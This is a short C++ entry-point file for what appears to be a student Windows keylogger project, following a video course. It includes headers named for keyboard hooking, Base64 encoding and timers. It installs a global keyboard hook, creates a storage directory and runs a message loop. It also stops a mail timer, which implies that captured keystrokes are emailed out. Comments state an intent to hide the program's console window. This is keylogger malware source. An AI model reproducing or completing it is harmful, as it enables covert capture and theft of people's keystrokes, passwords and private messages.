#include <iostream>

// including this for hiding the console window of the program
#include <windows.h>

#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "KeybHook.h"

int main(int argc, char* argv[]) {

	/*
		the below code block allows us to hide the console window
		of the program, as stated in the video lecture.

		upon running it though, it did not hide itself.
		need to fix this.
	*/
	MSG msg;
	
	IO::MkDir(IO::GetOurPath(true));

	InstallHook();

	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	MailTimer.Stop();

	return 0;
}